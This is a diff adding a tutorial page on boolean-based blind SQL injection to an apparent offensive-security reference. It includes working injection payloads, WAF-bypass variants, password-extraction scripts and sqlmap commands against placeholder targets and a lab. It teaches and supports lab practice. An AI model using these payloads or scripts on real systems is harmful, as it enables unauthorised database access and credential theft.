@@ -284,9 +284,1500 @@ PAGES.tools = "# Tools Index\n\n> All offensive security tools referenced in thi
 
 PAGES.labs = "# Lab Environments\n\n> Practice environments for every attack category in this database. No theory without practice.\n\n---\n\n## Online Platforms (No Setup Required)\n\n| Platform | Best For | URL | Cost |\n|---------|---------|-----|------|\n| **PortSwigger Web Security Academy** | Web attacks -- all categories | [portswigger.net/web-security](https://portswigger.net/web-security) | Free |\n| **HackTheBox** | Real-world machines, CTF-style | [hackthebox.com](https://hackthebox.com) | Free / Pro |\n| **TryHackMe** | Guided learning paths, beginner-friendly | [tryhackme.com](https://tryhackme.com) | Free / Pro |\n| **PentesterLab** | Web-specific, badge-based | [pentesterlab.com](https://pentesterlab.com) | Free / Pro |\n| **OWASP WebGoat** | Deliberately insecure -- all OWASP top 10 | [webgoat.github.io](https://webgoat.github.io) | Free |\n\n---\n\n## Self-Hosted Vulnerable Apps\n\n| App | Covers | Setup |\n|-----|--------|-------|\n| **DVWA** | SQLi, XSS, CSRF, File inclusion, Command injection | `docker run -p 80:80 vulnerables/web-dvwa` |\n| **bWAPP** | 100+ vulnerabilities across all categories | `docker run -p 80:80 raesene/bwapp` |\n| **WebGoat** | OWASP top 10, injection, auth, access control | `docker run -p 8080:8080 webgoat/goat-and-wolf` |\n| **Mutillidae** | OWASP top 10, injection-heavy | `docker run -p 80:80 citizenstig/nowasp` |\n| **NodeGoat** | Node.js-specific OWASP top 10 | `git clone github.com/OWASP/NodeGoat` |\n\n---\n\n## Attack-Specific Labs\n\n### SQL Injection\n- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection) -- 18 labs from basic to blind to OOB\n- [SQLi-labs](https://github.com/Audi-1/sqli-labs) -- 75 levels, MySQL-focused\n\n### SSTI\n- [PortSwigger SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)\n- [TryHackMe -- SSTI](https://tryhackme.com/room/learnssti)\n\n### SSRF\n- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)\n\n### XSS\n- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting) -- 30+ labs\n- [XSS Game (Google)](https://xss-game.appspot.com)\n\n### HTTP Request Smuggling\n- [PortSwigger Request Smuggling Labs](https://portswigger.net/web-security/request-smuggling)\n\n### Deserialization\n- [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization)\n\n### OAuth / JWT\n- [PortSwigger OAuth Labs](https://portswigger.net/web-security/oauth)\n- [PortSwigger JWT Labs](https://portswigger.net/web-security/jwt)\n\n---\n\n## CTF Platforms\n\n| Platform | Style | URL |\n|---------|-------|-----|\n| CTFtime | Event tracker | [ctftime.org](https://ctftime.org) |\n| picoCTF | Educational | [picoctf.org](https://picoctf.org) |\n| pwn.college | Systematic | [pwn.college](https://pwn.college) |\n\n---\n\n## Bug Bounty Programs (Real-World Practice)\n\n| Program | Platform |\n|---------|----------|\n| HackerOne Public Programs | [hackerone.com](https://hackerone.com/bug-bounty-programs) |\n| Bugcrowd Public Programs | [bugcrowd.com/programs](https://bugcrowd.com/programs) |\n| Intigriti Public Programs | [intigriti.com](https://app.intigriti.com/programs) |\n\n> Always read program scope and rules before testing. Testing outside scope is illegal.";
 
+PAGES.sqli_blind_boolean = `<p>
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CWE-89</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CAPEC-7</span>&nbsp;
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;">CVSS 9.8</span>&nbsp;
+<span style="background:#fd7e14;color:#fff;padding:2px 8px;border-radius:3px;">OWASP A05:2025</span>&nbsp;
+<span style="background:#17a2b8;color:#fff;padding:2px 8px;border-radius:3px;">CWE Top 25: 2019-2025</span>
+</p>
+
+# Boolean-Based Blind SQL Injection
+
+**CAT-01 > SQL Injection > Boolean-Based Blind**
+
+---
+
+## Overview
+
+When an application constructs SQL queries by concatenating user-supplied input without parameterization, an attacker can inject conditional SQL expressions that alter the query's boolean logic. In boolean-based blind SQL injection, the injected condition forces the database to evaluate a true-or-false question, and the application leaks the answer through an observable behavioral difference -- a change in page content, response size, HTTP status code, or the presence of a specific HTML element. The attacker never sees query results directly. Instead, they reconstruct data one character (or one bit) at a time by asking hundreds of binary questions: "Is the first character of the admin password greater than 'm'?" If true, the page renders normally. If false, the page changes. By halving the search space with each question (binary search), the attacker extracts each character in approximately 7 HTTP requests.
+
+The root cause is identical to all SQL injection: failure to separate data from code. The application treats attacker-controlled input as part of the SQL command structure rather than as a literal data value. What distinguishes boolean-based blind from classic SQL injection is the absence of visible output -- no query results displayed, no error messages leaked. The "blind" qualifier means the attacker must infer information through side channels rather than reading it directly from the response.
+
+The prerequisite is minimal: any parameter whose value is interpolated into a SQL WHERE clause, ORDER BY, HAVING, or similar conditional context. This includes URL query parameters, POST body fields, HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie), JSON API fields, GraphQL arguments, and path segments. The parameter need not be the primary one -- analytics tracking cookies, sort-order fields, and pagination offsets are frequent vectors because developers consider them low-risk and skip sanitization.
+
+Impact is identical to unrestricted SQL injection: full database read access (credentials, PII, financial records, session tokens), potential data modification or deletion, and in some database configurations (MSSQL with xp_cmdshell, PostgreSQL with COPY TO PROGRAM), escalation to operating system command execution. The only practical difference is speed -- blind extraction is slower than UNION-based injection, but automated tools like sqlmap reduce a 20-character password extraction from hours of manual work to under 60 seconds.
+
+Boolean-based blind SQL injection has been present in the OWASP Top 10 continuously since 2004 and in the CWE Top 25 every year from 2019 through 2025. CAPEC-7 rates the likelihood of attack as High and skill required as Medium. CWE-89 rates exploitability as High. Resources required: none.
+
+---
+
+## Understanding From Zero
+
+### The Core Concept (No Jargon)
+
+Imagine a locked building with a doorbell. You cannot see inside, and nobody will open the door to show you anything. But the doorbell has a peculiar behavior: when you ring it with a TRUE statement, the light above the door turns green. When you ring it with a FALSE statement, the light stays off.
+
+You cannot ask the building to hand you the combination to the safe. But you CAN ask yes-or-no questions:
+
+- "Is the first digit of the combination greater than 5?" Green light = yes.
+- "Is it greater than 7?" No light = no.
+- "Is it greater than 6?" Green light = yes.
+- "Is it equal to 7?" Green light = yes.
+
+Four questions, and you know the first digit is 7. Repeat for each digit. That is boolean-based blind SQL injection: asking a database yes-or-no questions through a web application that unintentionally reveals the answers through behavioral changes.
+
+### What's Actually Happening (Technical)
+
+The application has code like this (PHP example):
+
+\`\`\`php
+// VULNERABLE: user input concatenated into SQL
+$trackingId = $_COOKIE['TrackingId'];
+$query = "SELECT * FROM tracking WHERE id = '" . $trackingId . "'";
+$result = mysqli_query($conn, $query);
+if (mysqli_num_rows($result) > 0) {
+    echo '<p>Welcome back!</p>';
+}
+\`\`\`
+
+When the user sends a normal cookie value \`abc123\`, the query becomes:
+
+\`\`\`sql
+SELECT * FROM tracking WHERE id = 'abc123'
+\`\`\`
+
+When the attacker sends \`abc123' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' --\`, the query becomes:
+
+\`\`\`sql
+SELECT * FROM tracking WHERE id = 'abc123' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='s' --'
+\`\`\`
+
+If the first character of the admin password IS \`s\`, the AND condition is true, the row is returned, and "Welcome back!" appears. If NOT, the AND makes the overall WHERE clause false, no row is returned, and "Welcome back!" is absent. The attacker sees the difference and knows the character.
+
+### Why The Application Doesn't Stop This
+
+The application trusts the input. It assumes the cookie value is just a tracking ID -- a harmless string. It never validates that the value contains only alphanumeric characters, and it concatenates the raw value directly into the SQL string. The database parser cannot distinguish between the developer's intended SQL structure and the attacker's injected SQL because they are delivered as a single undifferentiated string.
+
+Error message suppression does not help. CAPEC-7 explicitly states: "Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages."
+
+### What An Attacker Can Do
+
+1. **Extract all database contents** -- usernames, password hashes, email addresses, credit card data, session tokens, API keys, PII
+2. **Bypass authentication** -- extract admin credentials, or inject always-true conditions
+3. **Modify or delete data** -- if stacked queries are supported (MSSQL, PostgreSQL)
+4. **Escalate to OS command execution** -- via \`xp_cmdshell\` (MSSQL), \`COPY TO PROGRAM\` (PostgreSQL), \`INTO OUTFILE\` (MySQL)
+5. **Pivot to other systems** -- extracted credentials frequently grant access to other services (credential reuse)
+
+---
+
+## Attack Surface Identification
+
+### Classic Injection Points
+
+| Vector | Example | Risk Level |
+|--------|---------|------------|
+| URL query parameter | \`?id=1\`, \`?search=term\`, \`?page=2\` | High |
+| POST body field | \`username=admin&password=test\` | High |
+| Cookie value | \`Cookie: TrackingId=abc123; session=xyz\` | High |
+| HTTP header | \`User-Agent: Mozilla/5.0...\`, \`X-Forwarded-For: 127.0.0.1\` | Medium-High |
+| URL path segment | \`/api/users/123/profile\` | Medium |
+| Sort/order parameter | \`?sort=name&order=asc\` | Medium |
+| Pagination | \`?limit=10&offset=20\` | Medium |
+| Referer header | \`Referer: https://example.com/page\` | Medium |
+
+### Modern API Injection Points
+
+| Vector | Example | Notes |
+|--------|---------|-------|
+| JSON body | \`{"query": "search term"}\` | Most common modern vector |
+| GraphQL argument | \`{ user(id: "123") { name } }\` | Filter/where clauses especially |
+| REST filter | \`/api/items?filter[status]=active\` | ORM-mapped filter parameters |
+| GraphQL variable | \`{"variables": {"id": "123"}}\` | Often less validated than inline |
+| WebSocket message | \`{"action": "search", "term": "xyz"}\` | Rarely tested by scanners |
+
+### ORM Context Injection Points
+
+| ORM | Vulnerable Pattern | CVE Example |
+|-----|-------------------|-------------|
+| Django | \`extra()\`, \`raw()\` with f-strings, JSONField \`values()\` | CVE-2024-42005 |
+| Rails ActiveRecord | \`annotate()\`, \`optimizer_hints()\`, string interpolation in \`where()\` | CVE-2023-22794 |
+| Prisma | \`$queryRawUnsafe()\`, string concatenation in \`$queryRaw()\` | -- |
+| Sequelize | Template literals in \`query()\`, operator injection | CVE-2019-10748 |
+| Hibernate/JPA | String concatenation in HQL \`createQuery()\` | -- |
+| TypeORM | Raw query with string interpolation | -- |
+| GORM (Go) | \`fmt.Sprintf\` in \`Raw()\` | -- |
+| Navidrome | LIKE-based parameter injection (wildcard) | CVE-2024-47062 |
+
+### Technology Indicators and Recon
+
+\`\`\`bash
+# Identify technology stack (helps choose DB-specific payloads)
+whatweb target.com
+wappalyzer target.com
+
+# Look for parameter patterns suggesting SQL backend
+# Sort/filter params, search boxes, login forms, API endpoints with IDs
+# Check for cookies that look like they feed into queries
+
+# Common indicators of SQL backend:
+# - Numeric IDs in URLs (?id=123)
+# - Search functionality returning structured results
+# - Error messages containing SQL keywords (even partial)
+# - Response changes when appending a single quote
+\`\`\`
+
+---
+
+## How It Works
+
+### Attack Flow
+
+\`\`\`mermaid
+flowchart TD
+    A["Identify injectable parameter"] --> B["Send TRUE condition: ' AND 1=1--"]
+    B --> C{"Response differs from baseline?"}
+    C -->|"No"| D["Not injectable or different context"]
+    C -->|"Yes"| E["Send FALSE condition: ' AND 1=2--"]
+    E --> F{"Response matches baseline (false)?"}
+    F -->|"No"| D
+    F -->|"Yes"| G["Boolean blind SQLi confirmed"]
+    G --> H["Determine DB type via fingerprint queries"]
+    H --> I["Enumerate tables via boolean questions"]
+    I --> J["Enumerate columns via boolean questions"]
+    J --> K["Extract data character-by-character"]
+    K --> L["Binary search: ASCII(SUBSTR(data,pos,1))>mid"]
+    L --> M{"TRUE response?"}
+    M -->|"Yes"| N["low = mid + 1"]
+    M -->|"No"| O["high = mid - 1"]
+    N --> P{"low > high?"}
+    O --> P
+    P -->|"No"| L
+    P -->|"Yes"| Q["Character found: chr(low)"]
+    Q --> R{"More positions?"}
+    R -->|"Yes"| K
+    R -->|"No"| S["Complete value extracted"]
+\`\`\`
+
+### Binary Search Explanation
+
+ASCII printable characters range from 32 (space) to 126 (~). Binary search halves this range with each query:
+
+\`\`\`
+Target character: 's' (ASCII 115)
+
+Query 1: ASCII(char) > 79?  YES  --> range narrows to 80-126
+Query 2: ASCII(char) > 103? YES  --> range narrows to 104-126
+Query 3: ASCII(char) > 115? NO   --> range narrows to 104-115
+Query 4: ASCII(char) > 109? YES  --> range narrows to 110-115
+Query 5: ASCII(char) > 112? YES  --> range narrows to 113-115
+Query 6: ASCII(char) > 114? YES  --> range narrows to 115-115
+Query 7: ASCII(char) = 115? YES  --> character is 's'
+
+7 requests per character. For a 20-character password: 140 requests total.
+Compare to linear brute force: up to 95 * 20 = 1,900 requests.
+\`\`\`
+
+### DB-Specific Conditional Syntax
+
+| Database | Boolean Conditional | Substring | ASCII | Comment |
+|----------|-------------------|-----------|-------|---------|
+| MySQL | \`IF(cond, T, F)\` | \`SUBSTRING(s,p,l)\` / \`MID()\` / \`SUBSTR()\` | \`ASCII()\` / \`ORD()\` | \`-- \` (trailing space!) or \`#\` |
+| PostgreSQL | \`CASE WHEN cond THEN T ELSE F END\` | \`SUBSTRING(s FROM p FOR l)\` | \`ASCII()\` | \`--\` |
+| MSSQL | \`CASE WHEN\` / \`IIF()\` (2012+) | \`SUBSTRING(s,p,l)\` | \`ASCII()\` / \`UNICODE()\` | \`--\` |
+| Oracle | \`CASE WHEN\` / \`DECODE()\` | \`SUBSTR(s,p,l)\` (NOT SUBSTRING) | \`ASCII()\` | \`--\` |
+| SQLite | \`CASE WHEN\` / \`IIF()\` (3.32+) | \`SUBSTR(s,p,l)\` | \`UNICODE()\` (NOT ASCII) | \`--\` |
+
+---
+
+## Detection and Validation
+
+### Probe Payloads (True/False Pairs)
+
+Send these pairs and compare responses. Different responses confirm injection.
+
+\`\`\`sql
+-- String context
+' AND '1'='1        -- TRUE (normal behavior)
+' AND '1'='2        -- FALSE (different behavior)
+
+-- Numeric context
+1 AND 1=1           -- TRUE
+1 AND 1=2           -- FALSE
+
+-- Parenthesized context
+') AND ('1'='1      -- TRUE
+') AND ('1'='2      -- FALSE
+
+-- Double-parenthesized
+')) AND (('1'='1    -- TRUE
+')) AND (('1'='2    -- FALSE
+\`\`\`
+
+### Response Differential Analysis
+
+| Signal Type | TRUE Indicator | FALSE Indicator |
+|------------|---------------|-----------------|
+| Content-based | "Welcome back" present | "Welcome back" absent |
+| Size-based | Response is 4532 bytes | Response is 4218 bytes |
+| Status-based | HTTP 200 | HTTP 302 or 500 |
+| JSON-based | \`{"results": [...data...]}\` | \`{"results": []}\` |
+| Redirect-based | No redirect | Redirect to /error |
+
+### Automated Detection
+
+\`\`\`bash
+# sqlmap -- detect boolean blind injection
+sqlmap -u "http://target.com/page?id=1" --technique=B --batch
+
+# sqlmap -- cookie-based injection (PortSwigger TrackingId pattern)
+sqlmap -u "http://target.com/" --cookie="TrackingId=abc*" --technique=B --batch
+
+# sqlmap -- header injection
+sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1*" --technique=B --level=3 --batch
+
+# sqlmap -- JSON body
+sqlmap -u "http://target.com/api/search" --data='{"query":"test"}' --technique=B --batch
+
+# ghauri -- alternative to sqlmap with better WAF bypass
+ghauri -u "http://target.com/page?id=1" --technique=B --dbs
+\`\`\`
+
+---
+
+## Beginner Lab Walkthrough
+
+### DVWA Setup (Docker)
+
+\`\`\`bash
+# Launch DVWA in Docker
+docker run -d -p 8080:80 --name dvwa vulnerables/web-dvwa
+
+# Access at http://localhost:8080
+# Default credentials: admin / password
+# Navigate to: DVWA Security > Set to "Low"
+# Navigate to: SQL Injection (Blind)
+\`\`\`
+
+### PortSwigger Lab: "Blind SQL injection with conditional responses"
+
+**Lab URL:** https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
+
+**Step 1: Identify the injection point**
+
+Open Burp Suite, browse the lab application, and observe the \`TrackingId\` cookie in requests. Note that when you visit pages, a "Welcome back!" message appears.
+
+**Step 2: Test for boolean blind SQLi**
+
+In Burp Repeater, modify the cookie:
+
+\`\`\`
+Cookie: TrackingId=abc' AND '1'='1
+\`\`\`
+Response contains "Welcome back!" -- TRUE condition works.
+
+\`\`\`
+Cookie: TrackingId=abc' AND '1'='2
+\`\`\`
+Response does NOT contain "Welcome back!" -- FALSE condition changes behavior. Injection confirmed.
+
+**Step 3: Confirm the target table and user exist**
+
+\`\`\`
+Cookie: TrackingId=abc' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+\`\`\`
+"Welcome back!" appears. The \`users\` table exists, and the \`administrator\` user exists.
+
+**Step 4: Determine password length**
+
+\`\`\`
+Cookie: TrackingId=abc' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a
+\`\`\`
+"Welcome back!" -- length is greater than 19.
+
+\`\`\`
+Cookie: TrackingId=abc' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
+\`\`\`
+No "Welcome back!" -- length is NOT greater than 20. Password is exactly 20 characters.
+
+**Step 5: Extract the password**
+
+**Option A — Burp Intruder (requires Burp Suite Pro):**
+
+Configure Cluster Bomb attack:
+- Position 1: character position (1-20)
+- Position 2: character value (a-z, 0-9)
+
+\`\`\`
+Cookie: TrackingId=abc' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{1},1)='{2}
+\`\`\`
+
+Grep Match for "Welcome back" — matched responses reveal each character.
+
+> **Note:** Cluster Bomb attack type is a Burp Suite Professional feature.
+> Burp Community Edition limits Intruder to single-thread and no Cluster Bomb.
+
+**Option B — Free alternative (Python script, no Burp Pro needed):**
+
+\`\`\`python
+import requests
+
+url = "https://TARGET.web-security-academy.net/"
+charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+password = ""
+
+for pos in range(1, 21):
+    for char in charset:
+        cookies = {
+            "TrackingId": f"abc' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}",
+            "session": "YOUR_SESSION_COOKIE"
+        }
+        r = requests.get(url, cookies=cookies)
+        if "Welcome back" in r.text:
+            password += char
+            print(f"[+] Position {pos}: {char}  (password so far: {password})")
+            break
+
+print(f"\\n[*] Admin password: {password}")
+\`\`\`
+
+Run: \`python3 extract.py\` — takes ~2 minutes for a 20-character password.
+
+**Option C — Manual Repeater iteration:**
+
+Use Burp Repeater (free) — manually change the position and character in each request. Slow (720 requests worst case) but works without Pro. Use binary search to reduce to ~140 requests:
+
+\`\`\`
+-- Is char > 'm'? (narrows to a-m or n-z)
+' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1) > 'm
+-- Then narrow further: > 't'? > 'p'? etc.
+\`\`\`
+
+**Step 6: Understand what happened**
+
+Each request asked the database: "Is the Nth character of the admin password equal to X?" The database evaluated this as part of the WHERE clause. When true, the tracking query returned a row, and the application displayed "Welcome back!" When false, no row was returned, and the message was absent.
+
+### Common Beginner Mistakes
+
+1. **Forgetting to close the string context** -- the injected payload must produce valid SQL
+2. **Not identifying the comment style** -- MySQL requires a space after \`--\`; use \`#\` as alternative
+3. **Using \`OR 1=1\` carelessly** -- OWASP explicitly warns this can modify UPDATE/DELETE queries and cause data loss
+4. **Not establishing a stable baseline** -- dynamic content (timestamps, CSRF tokens) can cause false positives
+5. **Testing with \`AND 1=1\` when the original query returns no rows** -- the AND makes no difference on an empty result
+
+---
+
+## Techniques
+
+### Level 0: Understanding the Concept
+
+At this level, the attacker understands that SQL queries can be manipulated through user input, and that different responses indicate true/false conditions.
+
+\`\`\`sql
+-- The most basic boolean probe
+' AND '1'='1     -- Does the page change?
+' AND '1'='2     -- Does it change differently?
+\`\`\`
+
+### Level 1: First Boolean Probe and Basic Extraction
+
+\`\`\`sql
+-- Confirm injection exists
+' AND 1=1--                                       -- TRUE condition
+' AND 1=2--                                       -- FALSE condition
+
+-- Determine if a specific table exists
+' AND (SELECT COUNT(*) FROM users)>0--            -- TRUE if users table exists
+
+-- Extract first character of a value (linear search)
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'--
+-- ... continue through alphabet until TRUE response
+
+-- Determine string length
+' AND LENGTH((SELECT password FROM users WHERE username='admin'))>10--
+' AND LENGTH((SELECT password FROM users WHERE username='admin'))=20--
+\`\`\`
+
+### Level 2: Binary Search Optimization and Multi-DB Syntax
+
+\`\`\`sql
+-- Binary search (7 requests per character instead of up to 95)
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>79--    -- midpoint of 32-126
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>103--   -- narrow further
+-- Continue halving until exact value found
+
+-- MySQL: use ORD + MID as synonyms
+' AND ORD(MID((SELECT password FROM users LIMIT 1),1,1))>79--
+
+-- PostgreSQL: use CASE WHEN (no IF function)
+' AND (CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>79 THEN TRUE ELSE FALSE END)--
+
+-- MSSQL: use TOP 1 instead of LIMIT
+' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>79--
+
+-- Oracle: use SUBSTR (not SUBSTRING) and ROWNUM
+' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>79--
+
+-- SQLite: use UNICODE instead of ASCII
+' AND UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>79--
+\`\`\`
+
+### Level 3: WAF Bypass, ORM Exploitation, and API Context
+
+\`\`\`sql
+-- Comment-based space replacement (bypasses basic WAFs)
+'/**/AND/**/ASCII(SUBSTRING(database(),1,1))>79--
+
+-- MySQL version comments (executes on MySQL 5.0+, WAF sees as comment)
+'/*!50000AND*/ASCII(/*!50000SUBSTRING*/(database(),1,1))>79--
+
+-- Function synonym substitution (when SUBSTRING is blocked)
+' AND ORD(MID(database(),1,1))>79--                          -- MySQL
+' AND HEX(MID(database(),1,1))>'4F'--                        -- hex comparison
+
+-- Hex encoding to avoid quotes
+' AND SUBSTRING(database(),1,1)=0x75--                        -- 0x75 = 'u'
+' AND SUBSTRING(database(),1,1)=CHAR(117)--                   -- CHAR(117) = 'u'
+
+-- JSON body injection
+-- POST: {"username": "admin' AND ASCII(SUBSTRING(database(),1,1))>79-- -"}
+
+-- GraphQL injection
+-- {"query": "{ user(id: \\"1' AND ASCII(SUBSTRING(database(),1,1))>79-- -\\") { name } }"}
+
+-- Django ORM filter oracle (no SQL injection needed)
+-- GET /api/articles/?created_by__user__password__startswith=pbkdf2_sha256
+\`\`\`
+
+### Level 4: Bit Shifting, Huffman Optimization, and JSON-in-SQL Bypass
+
+\`\`\`sql
+-- Bit shifting: extract each bit individually (exactly 7 requests per ASCII character)
+' AND (ASCII(SUBSTR(user(),1,1)) >> 7)=0--     -- test bit 7 (MSB)
+' AND (ASCII(SUBSTR(user(),1,1)) >> 6)=1--     -- test accumulated value after shift
+' AND (ASCII(SUBSTR(user(),1,1)) >> 5)=3--     -- continue for all 7 bits
+' AND (ASCII(SUBSTR(user(),1,1)) >> 4)=7--
+' AND (ASCII(SUBSTR(user(),1,1)) >> 3)=14--
+' AND (ASCII(SUBSTR(user(),1,1)) >> 2)=28--
+' AND (ASCII(SUBSTR(user(),1,1)) >> 1)=57--
+
+-- Bitwise AND alternative (when >> is filtered)
+' AND (ASCII(SUBSTR(user(),1,1)) & 128)=0--    -- test bit 7
+' AND (ASCII(SUBSTR(user(),1,1)) & 64)=64--    -- test bit 6
+' AND (ASCII(SUBSTR(user(),1,1)) & 32)=32--    -- test bit 5
+
+-- Mathematical equivalent (when bitwise operators are filtered)
+' AND FLOOR(ASCII(SUBSTR(user(),1,1)) / 128) = 0--    -- bit 7
+' AND FLOOR(ASCII(SUBSTR(user(),1,1)) / 64) % 2 = 1-- -- bit 6
+
+-- JSON-in-SQL WAF bypass (Claroty Team82 research, bypassed 5 major WAFs)
+-- PostgreSQL:
+' OR '{"b":2}'::jsonb <@ '{"a":1,"b":2}'::jsonb--
+-- MySQL:
+' OR JSON_EXTRACT('{"id":14}','$.id')=14--
+-- SQLite:
+' OR json_extract('{"a":1}','$.a')=1--
+-- MSSQL:
+' OR JSON_VALUE('{"name":"admin"}','$.name')='admin'--
+
+-- Combined: JSON bypass + boolean blind extraction (PostgreSQL)
+' AND (SELECT CASE WHEN ASCII(SUBSTRING(current_database(),1,1))>96
+  THEN '{"a":1}'::jsonb <@ '{"a":1}'::jsonb ELSE FALSE END)--
+\`\`\`
+
+### Level 5: Hakuin ML Optimization, Protocol-Level Smuggling, and WAFFLED
+
+**Hakuin ML-Optimized Extraction:**
+
+\`\`\`python
+from hakuin import Requester, BooleanBlindExfiltrator
+from hakuin.dbms import MySQL
+
+class TargetRequester(Requester):
+    def request(self, payload):
+        import requests
+        r = requests.get(
+            "http://target.com/page",
+            params={"id": f"1' AND ({payload})-- -"},
+            cookies={"session": "abc123"}
+        )
+        return "Welcome" in r.text
+
+requester = TargetRequester()
+exfiltrator = BooleanBlindExfiltrator(requester, dbms=MySQL)
+
+# ML-optimized schema extraction (6x faster than binary search)
+tables = exfiltrator.extract_table_names()
+columns = exfiltrator.extract_column_names("users")
+data = list(exfiltrator.extract_rows("users", ["username", "password"]))
+\`\`\`
+
+Hakuin uses probabilistic language models trained on millions of real database schemas (Stack Exchange data) to predict likely table/column names. Instead of binary search (7 requests/character), adaptive Huffman-like coding reduces extraction to ~4.2 requests/character for English text and even fewer for predictable schema names. For columns with limited value sets (e.g., status fields), speedup reaches 26x.
+
+**Protocol-Level SQL Smuggling (DEF CON 32, Paul Gerste, 2024):**
+
+Exploits binary protocol vulnerabilities in database drivers. A 4GB string overflows PostgreSQL's wire protocol message size field, causing the remaining bytes to be interpreted as a new SQL command. This bypasses all application-level defenses because the injection occurs at the protocol level, below the ORM/parameterization layer. Attack vectors include compression, WebSocket framing, and HTTP request fragmentation.
+
+**WAFFLED Automated Parsing Discrepancy Discovery (ACSAC 2025):**
+
+Grammar-based fuzzer that discovers WAF bypasses by mutating HTTP envelope structure (Content-Type, boundaries, encoding) while keeping the attack payload intact. Found 1,207 confirmed bypasses across Cloudflare, Google Cloud Armor, AWS WAF, Azure WAF, and ModSecurity CRS 3.3. The key insight: WAF vendors must perfectly replicate every backend parser's behavior -- an impossible task given web framework diversity.
+
+---
+
+## Tactics (MITRE ATT&CK Mapping)
+
+| ATT&CK Tactic | Technique | Boolean Blind SQLi Application |
+|---------------|-----------|-------------------------------|
+| Reconnaissance (TA0043) | Active Scanning (T1595) | Probe parameters with true/false conditions to identify injection points |
+| Initial Access (TA0001) | Exploit Public-Facing Application (T1190) | Inject SQL through web application input fields |
+| Credential Access (TA0006) | OS Credential Dumping (T1003) | Extract password hashes from database tables |
+| Collection (TA0009) | Data from Information Repositories (T1213) | Extract PII, financial data, session tokens from database |
+| Exfiltration (TA0010) | Exfiltration Over Web Service (T1567) | Extract data through boolean-differential HTTP responses or DNS OOB |
+| Impact (TA0040) | Data Manipulation (T1565) | Modify/delete database records via stacked queries |
+| Privilege Escalation (TA0004) | Exploitation for Privilege Escalation (T1068) | SQLi to xp_cmdshell (MSSQL) or COPY TO PROGRAM (PostgreSQL) for RCE |
+
+---
+
+## Tools
+
+### Tool Comparison
+
+| Tool | Type | Boolean Blind | Key Strength | Speed | URL |
+|------|------|---------------|-------------|-------|-----|
+| sqlmap | Comprehensive | Yes (\`--technique=B\`) | Auto-detection, tamper scripts, 6 technique types | Fast (threaded) | https://github.com/sqlmapproject/sqlmap |
+| Burp Intruder | Manual/Semi-auto | Yes (Cluster Bomb) | Visual response comparison, Grep Match | Manual | https://portswigger.net/burp |
+| ghauri | Lightweight | Yes (\`--technique=B\`) | Better WAF bypass than sqlmap in some cases | Moderate | https://github.com/r0oth3x49/ghauri |
+| Hakuin | ML-optimized | Yes | 6-26x faster via probabilistic models | Fastest | https://github.com/pruzko/hakuin |
+| xxblind | Multi-strategy | Yes | 5 optimization levels (linear to dictionary) | Variable | https://github.com/secgroup/xxblind |
+| bbqsql | Blind-specific | Yes | Semi-automated, configurable comparison | Moderate | https://github.com/Blind-Sql-Bitshifting/bbqsql |
+
+### Deep Dive: sqlmap --technique=B
+
+\`\`\`bash
+# Basic boolean blind detection
+sqlmap -u "http://target.com/page?id=1" --technique=B --batch
+
+# Cookie-based injection
+sqlmap -u "http://target.com/" --cookie="TrackingId=xyz*" --technique=B --batch
+
+# String matching (key for reliable boolean detection)
+sqlmap -u "http://target.com/page?id=1" --technique=B --string="Welcome back" --batch
+
+# Negative string matching
+sqlmap -u "http://target.com/page?id=1" --technique=B --not-string="error" --batch
+
+# HTTP status code matching
+sqlmap -u "http://target.com/page?id=1" --technique=B --code=200 --batch
+
+# Full extraction with threading
+sqlmap -u "http://target.com/page?id=1" --technique=B --threads=8 --batch -D dbname -T users --dump
+
+# WAF bypass with tamper scripts
+sqlmap -u "http://target.com/page?id=1" --technique=B --tamper=space2comment,between,randomcase --batch
+
+# High detection level (tests cookies at level 2, headers at level 3)
+sqlmap -u "http://target.com/page?id=1" --technique=B --level=3 --risk=2 --batch
+
+# From Burp request file
+sqlmap -r request.txt --technique=B --string="Welcome" --threads=5 --batch
+
+# Text-only comparison (strips HTML for cleaner diff)
+sqlmap -u "http://target.com/page?id=1" --technique=B --text-only --batch
+
+# Title-based comparison
+sqlmap -u "http://target.com/page?id=1" --technique=B --titles --batch
+
+# Predict output (statistical optimization)
+sqlmap -u "http://target.com/page?id=1" --technique=B --predict-output --batch
+
+# JSON body injection
+sqlmap -u "http://target.com/api/search" --data='{"query":"test"}' --technique=B --batch
+
+# Header injection with custom marker
+sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 127.0.0.1*" --technique=B --level=3 --batch
+\`\`\`
+
+**Key sqlmap Flags for Boolean Blind:**
+
+| Flag | Purpose |
+|------|---------|
